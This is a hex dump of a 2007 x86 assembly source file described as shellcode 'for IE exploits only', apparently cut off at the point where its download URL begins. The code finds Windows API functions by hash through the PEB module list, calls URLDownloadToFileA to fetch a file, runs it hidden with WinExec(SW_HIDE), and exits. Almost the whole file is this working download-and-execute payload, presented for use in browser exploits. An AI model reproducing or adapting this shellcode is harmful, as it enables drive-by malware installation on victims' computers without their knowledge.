00000000  3b 0d 0a 3b 20 72 65 6c  6f 63 61 74 65 61 62 6c  |;..; relocateabl|
00000010  65 20 64 79 6e 61 6d 69  63 20 72 75 6e 74 69 6d  |e dynamic runtim|
00000020  65 20 61 73 73 65 6d 62  6c 79 20 63 6f 64 65 20  |e assembly code |
00000030  65 78 61 6d 70 6c 65 20  75 73 69 6e 67 20 68 61  |example using ha|
00000040  73 68 20 6c 6f 6f 6b 75  70 20 2a 2a 2a 20 66 6f  |sh lookup *** fo|
00000050  72 20 49 45 20 65 78 70  6c 6f 69 74 73 20 6f 6e  |r IE exploits on|
00000060  6c 79 20 2a 2a 2a 0d 0a  3b 20 74 68 65 20 55 52  |ly ***..; the UR|
00000070  4c 4d 4f 4e 2e 44 4c 4c  20 6d 75 73 74 20 61 6c  |LMON.DLL must al|
00000080  72 65 61 64 79 20 62 65  20 6c 6f 61 64 65 64 20  |ready be loaded |
00000090  69 6e 74 6f 20 74 68 65  20 70 72 6f 63 65 73 73  |into the process|
000000a0  20 73 70 61 63 65 20 66  6f 72 20 74 68 69 73 20  | space for this |
000000b0  74 6f 20 77 6f 72 6b 2c  20 73 6f 20 64 6f 20 6e  |to work, so do n|
000000c0  6f 74 20 72 75 6e 20 6f  6e 20 69 74 73 20 6f 77  |ot run on its ow|
000000d0  6e 21 21 0d 0a 3b 0d 0a  3b 20 74 6f 20 74 65 73  |n!!..;..; to tes|
000000e0  74 20 75 73 65 20 2f 44  54 45 53 54 5f 43 4f 44  |t use /DTEST_COD|
000000f0  45 20 69 6e 20 6d 6c 20  63 6f 6d 6d 61 6e 64 20  |E in ml command |
00000100  6c 69 6e 65 0d 0a 3b 0d  0a 3b 20 55 52 4c 44 6f  |line..;..; URLDo|
00000110  77 6e 4c 6f 61 64 54 6f  46 69 6c 65 41 28 29 20  |wnLoadToFileA() |
00000120  2f 20 57 69 6e 45 78 65  63 28 29 20 2f 20 45 78  |/ WinExec() / Ex|
00000130  69 74 50 72 6f 63 65 73  73 28 29 20 7c 20 45 78  |itProcess() | Ex|
00000140  69 74 54 68 72 65 61 64  28 29 0d 0a 3b 0d 0a 3b  |itThread()..;..;|
00000150  20 31 32 34 20 62 79 74  65 73 0d 0a 3b 0d 0a 3b  | 124 bytes..;..;|
00000160  20 66 6f 72 20 74 65 73  74 69 6e 67 3a 0d 0a 3b  | for testing:..;|
00000170  0d 0a 3b 20 6d 6c 20 2f  63 20 2f 63 6f 66 66 20  |..; ml /c /coff |
00000180  2f 43 70 20 2f 44 54 45  53 54 5f 43 4f 44 45 20  |/Cp /DTEST_CODE |
00000190  64 65 78 65 63 33 32 2e  61 73 6d 0d 0a 3b 20 6c  |dexec32.asm..; l|
000001a0  69 6e 6b 20 2f 73 75 62  73 79 73 74 65 6d 3a 77  |ink /subsystem:w|
000001b0  69 6e 64 6f 77 73 20 2f  73 65 63 74 69 6f 6e 3a  |indows /section:|
000001c0  2e 74 65 78 74 2c 77 20  64 65 78 65 63 33 32 2e  |.text,w dexec32.|
000001d0  6f 62 6a 20 75 72 6c 6d  6f 6e 2e 6c 69 62 0d 0a  |obj urlmon.lib..|
000001e0  3b 0d 0a 3b 20 77 79 73  65 31 30 31 20 5b 61 74  |;..; wyse101 [at|
000001f0  5d 20 67 6d 61 69 6c 2e  63 6f 6d 0d 0a 3b 0d 0a  |] gmail.com..;..|
00000200  3b 20 4d 61 72 63 68 20  32 30 30 37 0d 0a 3b 0d  |; March 2007..;.|
00000210  0a 20 20 20 20 20 20 2e  33 38 36 0d 0a 20 20 20  |.      .386..   |
00000220  20 20 20 2e 6d 6f 64 65  6c 20 66 6c 61 74 2c 73  |   .model flat,s|
00000230  74 64 63 61 6c 6c 0d 0a  0d 0a 20 20 20 20 20 20  |tdcall....      |
00000240  52 4f 4c 5f 43 4f 4e 53  54 41 4e 54 20 65 71 75  |ROL_CONSTANT equ|
00000250  20 35 0d 0a 0d 0a 20 20  20 20 20 20 6d 72 6f 6c  | 5....      mrol|
00000260  20 6d 61 63 72 6f 20 69  4e 75 6d 3a 72 65 71 2c  | macro iNum:req,|
00000270  69 42 69 74 73 3a 72 65  71 0d 0a 20 20 20 20 20  |iBits:req..     |
00000280  20 20 20 20 20 20 65 78  69 74 6d 20 3c 28 69 4e  |      exitm <(iN|
00000290  75 6d 20 73 68 6c 20 69  42 69 74 73 29 20 6f 72  |um shl iBits) or|
000002a0  20 28 69 4e 75 6d 20 73  68 72 20 28 33 32 2d 69  | (iNum shr (32-i|
000002b0  42 69 74 73 29 29 3e 0d  0a 20 20 20 20 20 20 65  |Bits))>..      e|
000002c0  6e 64 6d 0d 0a 0d 0a 20  20 20 20 20 20 6d 72 6f  |ndm....      mro|
000002d0  72 20 6d 61 63 72 6f 20  69 4e 75 6d 3a 72 65 71  |r macro iNum:req|
000002e0  2c 69 42 69 74 73 3a 72  65 71 0d 0a 20 20 20 20  |,iBits:req..    |
000002f0  20 20 20 20 20 20 20 65  78 69 74 6d 20 3c 28 69  |       exitm <(i|
00000300  4e 75 6d 20 73 68 72 20  69 42 69 74 73 29 20 6f  |Num shr iBits) o|
00000310  72 20 28 69 4e 75 6d 20  73 68 6c 20 28 33 32 2d  |r (iNum shl (32-|
00000320  69 42 69 74 73 29 29 3e  0d 0a 20 20 20 20 20 20  |iBits))>..      |
00000330  65 6e 64 6d 0d 0a 0d 0a  20 20 20 20 20 20 68 61  |endm....      ha|
00000340  73 68 61 70 69 20 6d 61  63 72 6f 20 73 7a 41 70  |shapi macro szAp|
00000350  69 0d 0a 20 20 20 20 20  20 20 20 20 20 20 20 20  |i..             |
00000360  20 6c 6f 63 61 6c 20 64  77 41 70 69 0d 0a 0d 0a  | local dwApi....|
00000370  20 20 20 20 20 20 20 20  20 20 20 20 20 20 64 77  |              dw|
00000380  41 70 69 20 3d 20 30 0d  0a 0d 0a 20 20 20 20 20  |Api = 0....     |
00000390  20 20 20 20 20 20 20 20  20 66 6f 72 63 20 78 2c  |         forc x,|
000003a0  73 7a 41 70 69 0d 0a 20  20 20 20 20 20 20 20 20  |szApi..         |
000003b0  20 20 20 20 20 20 20 20  20 20 64 77 41 70 69 20  |          dwApi |
000003c0  3d 20 64 77 41 70 69 20  2b 20 27 26 78 27 0d 0a  |= dwApi + '&x'..|
000003d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000003e0  20 20 20 64 77 41 70 69  20 3d 20 6d 72 6f 6c 28  |   dwApi = mrol(|
000003f0  64 77 41 70 69 2c 52 4f  4c 5f 43 4f 4e 53 54 41  |dwApi,ROL_CONSTA|
00000400  4e 54 29 0d 0a 20 20 20  20 20 20 20 20 20 20 20  |NT)..           |
00000410  20 20 20 65 6e 64 6d 0d  0a 20 20 20 20 20 20 20  |   endm..       |
00000420  20 20 20 20 20 20 20 64  77 41 70 69 20 3d 20 6d  |       dwApi = m|
00000430  72 6f 6c 28 64 77 41 70  69 2c 52 4f 4c 5f 43 4f  |rol(dwApi,ROL_CO|
00000440  4e 53 54 41 4e 54 29 0d  0a 20 20 20 20 20 20 20  |NSTANT)..       |
00000450  20 20 20 20 20 20 20 64  77 20 28 64 77 41 70 69  |       dw (dwApi|
00000460  20 61 6e 64 20 30 66 66  66 66 68 29 0d 0a 20 20  | and 0ffffh)..  |
00000470  20 20 20 20 65 6e 64 6d  0d 0a 0d 0a 20 20 20 20  |    endm....    |
00000480  20 20 2e 63 6f 64 65 0d  0a 0d 0a 20 20 20 20 20  |  .code....     |
00000490  20 61 73 73 75 6d 65 20  66 73 3a 6e 6f 74 68 69  | assume fs:nothi|
000004a0  6e 67 0d 0a 0d 0a 63 6f  64 65 5f 73 74 61 72 74  |ng....code_start|
000004b0  3a 0d 0a 20 20 20 20 20  20 6a 6d 70 20 6c 6f 61  |:..      jmp loa|
000004c0  64 5f 64 61 74 61 0d 0a  49 46 44 45 46 20 54 45  |d_data..IFDEF TE|
000004d0  53 54 5f 43 4f 44 45 0d  0a 65 78 74 65 72 6e 20  |ST_CODE..extern |
000004e0  55 52 4c 44 6f 77 6e 6c  6f 61 64 54 6f 46 69 6c  |URLDownloadToFil|
000004f0  65 41 20 20 20 3a 70 72  6f 63 0d 0a 20 20 20 20  |eA   :proc..    |
00000500  20 20 63 61 6c 6c 20 55  52 4c 44 6f 77 6e 6c 6f  |  call URLDownlo|
00000510  61 64 54 6f 46 69 6c 65  41 20 20 20 20 20 20 20  |adToFileA       |
00000520  20 20 20 20 20 20 20 20  20 20 20 20 20 20 3b 20  |              ; |
00000530  69 6e 63 6c 75 64 65 64  20 77 68 65 6e 20 61 73  |included when as|
00000540  73 65 6d 62 6c 65 64 20  77 69 74 68 20 2f 44 54  |sembled with /DT|
00000550  45 53 54 5f 43 4f 44 45  0d 0a 45 4e 44 49 46 0d  |EST_CODE..ENDIF.|
00000560  0a 73 65 74 75 70 5f 70  61 72 61 6d 65 74 65 72  |.setup_parameter|
00000570  73 3a 0d 0a 20 20 20 20  20 20 70 6f 70 20 65 64  |s:..      pop ed|
00000580  69 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |i               |
00000590  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000005a0  20 20 20 20 20 20 3b 20  6f 66 66 73 65 74 20 40  |      ; offset @|
000005b0  63 6d 64 5f 73 74 61 72  74 0d 0a 20 20 20 20 20  |cmd_start..     |
000005c0  20 78 6f 72 20 65 61 78  2c 65 61 78 20 20 20 20  | xor eax,eax    |
000005d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000005e0  20 20 20 20 20 20 20 20  20 20 20 20 20 3b 20 65  |             ; e|
000005f0  61 78 20 3d 20 30 0d 0a  20 20 20 20 20 20 63 64  |ax = 0..      cd|
00000600  71 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |q               |
00000610  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000620  20 20 20 20 20 20 20 20  20 20 3b 20 65 64 78 20  |          ; edx |
00000630  3d 20 30 0d 0a 20 20 20  20 20 20 3b 20 2a 2a 2a  |= 0..      ; ***|
00000640  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |****************|
*
00000680  2a 0d 0a 20 20 20 20 20  20 70 75 73 68 20 65 61  |*..      push ea|
00000690  78 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |x               |
000006a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000006b0  20 20 20 20 20 3b 20 65  78 69 74 20 63 6f 64 65  |     ; exit code|
000006c0  20 20 3d 20 30 0d 0a 20  20 20 20 20 20 3b 20 2a  |  = 0..      ; *|
000006d0  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |****************|
*
00000710  2a 2a 2a 0d 0a 20 20 20  20 20 20 70 75 73 68 20  |***..      push |
00000720  65 61 78 20 20 20 20 20  20 20 20 20 20 20 20 20  |eax             |
00000730  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000740  20 20 20 20 20 20 20 3b  20 53 57 5f 48 49 44 45  |       ; SW_HIDE|
00000750  0d 0a 20 20 20 20 20 20  6d 6f 76 20 64 6c 2c 28  |..      mov dl,(|
00000760  40 63 6d 64 5f 65 6e 64  2d 40 63 6d 64 5f 73 74  |@cmd_end-@cmd_st|
00000770  61 72 74 29 2d 31 20 20  20 20 20 20 20 20 20 20  |art)-1          |
00000780  20 20 20 20 3b 20 74 68  69 73 20 61 6c 6c 6f 77  |    ; this allow|
00000790  73 20 63 6f 6d 6d 61 6e  64 20 75 70 20 74 6f 20  |s command up to |
000007a0  32 35 35 20 62 79 74 65  73 0d 0a 20 20 20 20 20  |255 bytes..     |
000007b0  20 70 75 73 68 20 65 64  69 20 20 20 20 20 20 20  | push edi       |
000007c0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000007d0  20 20 20 20 20 20 20 20  20 20 20 20 20 3b 20 66  |             ; f|
000007e0  69 6c 65 20 6e 61 6d 65  20 74 6f 20 65 78 65 63  |ile name to exec|
000007f0  75 74 65 0d 0a 20 20 20  20 20 20 3b 20 2a 2a 2a  |ute..      ; ***|
00000800  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |****************|
*
00000840  2a 0d 0a 20 20 20 20 20  20 70 75 73 68 20 65 61  |*..      push ea|
00000850  78 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |x               |
00000860  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000870  20 20 20 20 20 3b 20 63  61 6c 6c 62 61 63 6b 20  |     ; callback |
00000880  72 6f 75 74 69 6e 65 20  55 52 4c 44 6f 77 6e 4c  |routine URLDownL|
00000890  6f 61 64 54 6f 46 69 6c  65 41 0d 0a 20 20 20 20  |oadToFileA..    |
000008a0  20 20 70 75 73 68 20 65  61 78 20 20 20 20 20 20  |  push eax      |
000008b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000008c0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 3b 20  |              ; |
000008d0  72 65 73 65 72 76 65 64  2c 20 6d 75 73 74 20 62  |reserved, must b|
000008e0  65 20 7a 65 72 6f 0d 0a  20 20 20 20 20 20 70 75  |e zero..      pu|
000008f0  73 68 20 65 64 69 20 20  20 20 20 20 20 20 20 20  |sh edi          |
00000900  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000910  20 20 20 20 20 20 20 20  20 20 3b 20 66 69 6c 65  |          ; file|
00000920  20 6e 61 6d 65 20 74 6f  20 73 61 76 65 20 61 73  | name to save as|
00000930  0d 0a 20 20 20 20 20 20  61 64 64 20 65 64 69 2c  |..      add edi,|
00000940  65 64 78 20 20 20 20 20  20 20 20 20 20 20 20 20  |edx             |
00000950  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000960  20 20 20 20 3b 20 67 65  74 20 6f 66 66 73 65 74  |    ; get offset|
00000970  20 6f 66 20 40 75 72 6c  5f 73 74 61 72 74 2d 31  | of @url_start-1|
00000980  0d 0a 20 20 20 20 20 20  73 74 6f 73 62 20 20 20  |..      stosb   |
00000990  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
000009b0  20 20 20 20 3b 20 7a 65  72 6f 20 74 61 69 6c 20  |    ; zero tail |
000009c0  65 6e 64 0d 0a 20 20 20  20 20 20 6d 6f 76 20 64  |end..      mov d|
000009d0  6c 2c 28 40 75 72 6c 5f  65 6e 64 2d 40 75 72 6c  |l,(@url_end-@url|
000009e0  5f 73 74 61 72 74 29 2d  31 20 20 20 20 20 20 20  |_start)-1       |
000009f0  20 20 20 20 20 20 20 3b  20 6c 69 6d 69 74 20 6f  |       ; limit o|
00000a00  66 20 32 35 35 20 62 79  74 65 73 20 66 6f 72 20  |f 255 bytes for |
00000a10  75 72 6c 0d 0a 20 20 20  20 20 20 70 75 73 68 20  |url..      push |
00000a20  65 64 69 20 20 20 20 20  20 20 20 20 20 20 20 20  |edi             |
00000a30  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000a40  20 20 20 20 20 20 20 3b  20 75 72 6c 20 74 6f 20  |       ; url to |
00000a50  64 6f 77 6e 6c 6f 61 64  20 66 69 6c 65 20 66 72  |download file fr|
00000a60  6f 6d 0d 0a 20 20 20 20  20 20 70 75 73 68 20 65  |om..      push e|
00000a70  61 78 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |ax              |
00000a80  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000a90  20 20 20 20 20 20 3b 20  69 6e 74 65 72 66 61 63  |      ; interfac|
00000aa0  65 0d 0a 20 20 20 20 20  20 61 64 64 20 65 64 69  |e..      add edi|
00000ab0  2c 65 64 78 20 20 20 20  20 20 20 20 20 20 20 20  |,edx            |
00000ac0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000ad0  20 20 20 20 20 3b 20 67  65 74 20 6f 66 66 73 65  |     ; get offse|
00000ae0  74 20 6f 66 20 40 75 72  6c 6d 6f 6e 2d 31 0d 0a  |t of @urlmon-1..|
00000af0  20 20 20 20 20 20 73 74  6f 73 62 20 20 20 20 20  |      stosb     |
00000b00  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
00000b20  20 20 3b 20 7a 65 72 6f  20 74 61 69 6c 20 65 6e  |  ; zero tail en|
00000b30  64 20 6f 66 20 75 72 6c  0d 0a 20 20 20 20 20 20  |d of url..      |
00000b40  3b 20 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |; **************|
00000b50  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |****************|
*
00000b80  2a 2a 2a 2a 2a 2a 2a 0d  0a 6c 6f 61 64 5f 6d 6f  |*******..load_mo|
00000b90  64 75 6c 65 73 3a 0d 0a  20 20 20 20 20 20 70 75  |dules:..      pu|
00000ba0  73 68 20 65 64 69 20 20  20 20 20 20 20 20 20 20  |sh edi          |
00000bb0  20 20 20 20 20 20 20 20  20 3b 20 73 61 76 65 20  |         ; save |
00000bc0  63 75 72 72 65 6e 74 20  6f 66 66 73 65 74 20 74  |current offset t|
00000bd0  6f 20 68 61 73 68 65 73  0d 0a 20 20 20 20 20 20  |o hashes..      |
00000be0  70 75 73 68 20 33 30 68  0d 0a 20 20 20 20 20 20  |push 30h..      |
00000bf0  70 6f 70 20 65 63 78 0d  0a 20 20 20 20 20 20 6d  |pop ecx..      m|
00000c00  6f 76 20 65 61 78 2c 66  73 3a 5b 65 63 78 5d 20  |ov eax,fs:[ecx] |
00000c10  20 20 20 20 20 20 20 20  20 20 3b 20 50 45 42 20  |          ; PEB |
00000c20  62 61 73 65 20 61 64 64  72 65 73 73 0d 0a 20 20  |base address..  |
00000c30  20 20 20 20 6d 6f 76 20  65 61 78 2c 5b 65 61 78  |    mov eax,[eax|
00000c40  2b 30 63 68 5d 20 20 20  20 20 20 20 20 20 20 3b  |+0ch]          ;|
00000c50  20 50 45 42 5f 4c 44 52  5f 44 41 54 41 20 4c 6f  | PEB_LDR_DATA Lo|
00000c60  61 64 65 72 44 61 74 61  0d 0a 20 20 20 20 20 20  |aderData..      |
00000c70  6d 6f 76 20 65 62 70 2c  5b 65 61 78 2b 31 63 68  |mov ebp,[eax+1ch|
00000c80  5d 20 20 20 20 20 20 20  20 20 20 3b 20 4c 49 53  |]          ; LIS|
00000c90  54 5f 45 4e 54 52 59 20  49 6e 4d 65 6d 6f 72 79  |T_ENTRY InMemory|
00000ca0  4f 72 64 65 72 4d 6f 64  75 6c 65 4c 69 73 74 0d  |OrderModuleList.|
00000cb0  0a 73 63 61 6e 5f 64 6c  6c 3a 0d 0a 20 20 20 20  |.scan_dll:..    |
00000cc0  20 20 6d 6f 76 20 65 62  78 2c 5b 65 62 70 2b 38  |  mov ebx,[ebp+8|
00000cd0  5d 20 20 20 20 20 20 20  20 20 20 20 20 3b 20 44  |]            ; D|
00000ce0  6c 6c 42 61 73 65 0d 0a  20 20 20 20 20 20 6d 6f  |llBase..      mo|
00000cf0  76 20 65 62 70 2c 5b 65  62 70 5d 20 20 20 20 20  |v ebp,[ebp]     |
00000d00  20 20 20 20 20 20 20 20  20 3b 20 46 6c 69 6e 6b  |         ; Flink|
00000d10  0d 0a 20 20 20 20 20 20  70 75 73 68 20 65 62 70  |..      push ebp|
00000d20  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000d30  20 20 20 3b 20 73 61 76  65 0d 0a 0d 0a 20 20 20  |   ; save....   |
00000d40  20 20 20 6d 6f 76 20 65  61 78 2c 5b 65 62 78 2b  |   mov eax,[ebx+|
00000d50  33 63 68 5d 0d 0a 20 20  20 20 20 20 6d 6f 76 20  |3ch]..      mov |
00000d60  65 61 78 2c 5b 65 62 78  2b 65 61 78 2b 37 38 68  |eax,[ebx+eax+78h|
00000d70  5d 09 20 3b 20 49 4d 41  47 45 5f 44 49 52 45 43  |]. ; IMAGE_DIREC|
00000d80  54 4f 52 59 5f 45 4e 54  52 59 5f 45 58 50 4f 52  |TORY_ENTRY_EXPOR|
00000d90  54 0d 0a 20 20 20 20 20  20 6c 65 61 20 65 73 69  |T..      lea esi|
00000da0  2c 5b 65 62 78 2b 65 61  78 2b 31 38 68 5d 09 20  |,[ebx+eax+18h]. |
00000db0  3b 20 6f 66 66 73 65 74  20 49 4d 41 47 45 5f 45  |; offset IMAGE_E|
00000dc0  58 50 4f 52 54 5f 44 49  52 45 43 54 4f 52 59 2e  |XPORT_DIRECTORY.|
00000dd0  4e 75 6d 62 65 72 4f 66  4e 61 6d 65 73 0d 0a 20  |NumberOfNames.. |
00000de0  20 20 20 20 20 6c 6f 64  73 64 0d 0a 20 20 20 20  |     lodsd..    |
00000df0  20 20 78 63 68 67 20 65  61 78 2c 65 63 78 20 20  |  xchg eax,ecx  |
00000e00  20 20 20 20 20 20 20 20  20 20 20 20 20 3b 20 65  |             ; e|
00000e10  63 78 20 3d 20 4e 75 6d  62 65 72 4f 66 4e 61 6d  |cx = NumberOfNam|
00000e20  65 73 0d 0a 20 20 20 20  20 20 0d 0a 20 20 20 20  |es..      ..    |
00000e30  20 20 6c 6f 64 73 64 0d  0a 20 20 20 20 20 20 61  |  lodsd..      a|
00000e40  64 64 20 65 61 78 2c 65  62 78 20 20 20 20 20 20  |dd eax,ebx      |
00000e50  20 20 20 20 20 20 20 20  20 20 3b 20 41 64 64 72  |          ; Addr|
00000e60  65 73 73 4f 66 46 75 6e  63 74 69 6f 6e 73 0d 0a  |essOfFunctions..|
00000e70  20 20 20 20 20 20 70 75  73 68 20 65 61 78 0d 0a  |      push eax..|
00000e80  0d 0a 20 20 20 20 20 20  6c 6f 64 73 64 0d 0a 20  |..      lodsd.. |
00000e90  20 20 20 20 20 6c 65 61  20 65 64 69 2c 5b 65 61  |     lea edi,[ea|
00000ea0  78 2b 65 62 78 5d 20 20  20 20 20 20 20 20 20 20  |x+ebx]          |
00000eb0  3b 20 41 64 64 72 65 73  73 4f 66 4e 61 6d 65 73  |; AddressOfNames|
00000ec0  0d 0a 0d 0a 20 20 20 20  20 20 6c 6f 64 73 64 0d  |....      lodsd.|
00000ed0  0a 20 20 20 20 20 20 6c  65 61 20 65 62 70 2c 5b  |.      lea ebp,[|
00000ee0  65 61 78 2b 65 62 78 5d  09 09 20 3b 20 65 62 70  |eax+ebx].. ; ebp|
00000ef0  20 3d 20 41 64 64 72 65  73 73 4f 66 4e 61 6d 65  | = AddressOfName|
00000f00  4f 72 64 69 6e 61 6c 73  0d 0a 6c 6f 61 64 5f 61  |Ordinals..load_a|
00000f10  70 69 3a 0d 0a 20 20 20  20 20 20 6d 6f 76 20 65  |pi:..      mov e|
00000f20  73 69 2c 5b 65 64 69 2b  34 2a 65 63 78 2d 34 5d  |si,[edi+4*ecx-4]|
00000f30  0d 0a 20 20 20 20 20 20  61 64 64 20 65 73 69 2c  |..      add esi,|
00000f40  65 62 78 0d 0a 20 20 20  20 20 20 78 6f 72 20 65  |ebx..      xor e|
00000f50  61 78 2c 65 61 78 0d 0a  20 20 20 20 20 20 63 64  |ax,eax..      cd|
00000f60  71 0d 0a 68 61 73 68 5f  61 70 69 3a 0d 0a 20 20  |q..hash_api:..  |
00000f70  20 20 20 20 6c 6f 64 73  62 0d 0a 20 20 20 20 20  |    lodsb..     |
00000f80  20 61 64 64 20 65 64 78  2c 65 61 78 0d 0a 20 20  | add edx,eax..  |
00000f90  20 20 20 20 72 6f 6c 20  65 64 78 2c 52 4f 4c 5f  |    rol edx,ROL_|
00000fa0  43 4f 4e 53 54 41 4e 54  0d 0a 20 20 20 20 20 20  |CONSTANT..      |
00000fb0  64 65 63 20 65 61 78 0d  0a 20 20 20 20 20 20 6a  |dec eax..      j|
00000fc0  6e 73 20 68 61 73 68 5f  61 70 69 0d 0a 0d 0a 20  |ns hash_api.... |
00000fd0  20 20 20 20 20 6d 6f 76  20 65 73 69 2c 5b 65 73  |     mov esi,[es|
00000fe0  70 2b 38 5d 20 20 20 20  20 20 20 20 20 20 20 20  |p+8]            |
00000ff0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001000  20 3b 20 67 65 74 20 61  70 69 20 68 61 73 68 65  | ; get api hashe|
00001010  73 0d 0a 20 20 20 20 20  20 63 6d 70 20 64 78 2c  |s..      cmp dx,|
00001020  77 6f 72 64 20 70 74 72  5b 65 73 69 5d 20 20 20  |word ptr[esi]   |
00001030  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001040  20 20 20 20 20 3b 20 66  6f 75 6e 64 20 61 20 6d  |     ; found a m|
00001050  61 74 63 68 3f 0d 0a 20  20 20 20 20 20 6a 65 20  |atch?..      je |
00001060  63 61 6c 6c 5f 61 70 69  0d 0a 0d 0a 20 20 20 20  |call_api....    |
00001070  20 20 6c 6f 6f 70 20 6c  6f 61 64 5f 61 70 69 0d  |  loop load_api.|
00001080  0a 20 20 20 20 20 20 70  6f 70 20 65 61 78 20 20  |.      pop eax  |
00001090  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
000010b0  20 20 20 3b 20 63 68 65  63 6b 0d 0a 20 20 20 20  |   ; check..    |
000010c0  20 20 70 6f 70 20 65 62  70 20 20 20 20 20 20 20  |  pop ebp       |
000010d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000010e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 3b 0d  |              ;.|
000010f0  0a 20 20 20 20 20 20 6a  6d 70 20 73 63 61 6e 5f  |.      jmp scan_|
00001100  64 6c 6c 0d 0a 63 61 6c  6c 5f 61 70 69 3a 0d 0a  |dll..call_api:..|
00001110  20 20 20 20 20 20 70 6f  70 20 65 61 78 0d 0a 20  |      pop eax.. |
00001120  20 20 20 20 20 6d 6f 76  7a 78 20 65 64 78 2c 77  |     movzx edx,w|
00001130  6f 72 64 20 70 74 72 20  5b 65 62 70 2b 32 2a 65  |ord ptr [ebp+2*e|
00001140  63 78 2d 32 5d 0d 0a 20  20 20 20 20 20 61 64 64  |cx-2]..      add|
00001150  20 65 62 78 2c 5b 65 61  78 2b 34 2a 65 64 78 5d  | ebx,[eax+4*edx]|
00001160  0d 0a 20 20 20 20 20 20  70 6f 70 20 65 62 70 20  |..      pop ebp |
00001170  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
00001190  20 20 20 20 3b 20 6d 6f  64 75 6c 65 73 0d 0a 20  |    ; modules.. |
000011a0  20 20 20 20 20 70 6f 70  20 65 64 69 20 20 20 20  |     pop edi    |
000011b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
000011d0  20 3b 20 61 70 69 20 68  61 73 68 65 73 0d 0a 20  | ; api hashes.. |
000011e0  20 20 20 20 20 63 61 6c  6c 20 65 62 78 20 20 20  |     call ebx   |
000011f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
00001210  20 3b 20 63 61 6c 6c 20  61 70 69 0d 0a 20 20 20  | ; call api..   |
00001220  20 20 20 73 74 6f 73 77  20 20 20 20 20 20 20 20  |   stosw        |
00001230  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001240  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 3b  |               ;|
00001250  20 61 64 76 61 6e 63 65  20 32 20 62 79 74 65 73  | advance 2 bytes|
00001260  20 74 6f 20 6e 65 78 74  20 68 61 73 68 0d 0a 20  | to next hash.. |
00001270  20 20 20 20 20 6a 6d 70  20 6c 6f 61 64 5f 6d 6f  |     jmp load_mo|
00001280  64 75 6c 65 73 20 20 20  20 20 20 20 20 20 20 20  |dules           |
00001290  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000012a0  20 20 3b 20 64 6f 20 61  6e 6f 74 68 65 72 2c 20  |  ; do another, |
000012b0  6a 75 73 74 20 6b 65 65  70 20 67 6f 69 6e 67 20  |just keep going |
000012c0  75 6e 74 69 6c 20 45 78  69 74 50 72 6f 63 65 73  |until ExitProces|
000012d0  73 20 69 73 20 72 65 61  63 68 65 64 2e 0d 0a 20  |s is reached... |
000012e0  20 20 20 20 20 3b 20 2a  2a 2a 2a 2a 2a 2a 2a 2a  |     ; *********|
000012f0  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |****************|
00001300  0d 0a 6c 6f 61 64 5f 64  61 74 61 3a 0d 0a 20 20  |..load_data:..  |
00001310  20 20 20 20 63 61 6c 6c  20 73 65 74 75 70 5f 70  |    call setup_p|
00001320  61 72 61 6d 65 74 65 72  73 0d 0a 40 63 6d 64 5f  |arameters..@cmd_|
00001330  73 74 61 72 74 3a 0d 0a  20 20 20 20 20 20 64 62  |start:..      db|
00001340  20 27 66 69 6c 65 2e 65  78 65 27 2c 30 66 66 68  | 'file.exe',0ffh|
00001350  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001360  20 20 20 20 20 20 20 20  20 20 3b 20 57 69 6e 45  |          ; WinE|
00001370  78 65 63 28 22 66 69 6c  65 2e 65 78 65 22 2c 53  |xec("file.exe",S|
00001380  57 5f 48 49 44 45 29 3b  0d 0a 40 63 6d 64 5f 65  |W_HIDE);..@cmd_e|
00001390  6e 64 3a 0d 0a 40 75 72  6c 5f 73 74 61 72 74 3a  |nd:..@url_start:|
000013a0  0d 0a 20 20 20 20 20 20  64 62 20 27 68 74 74 70  |..      db 'http|
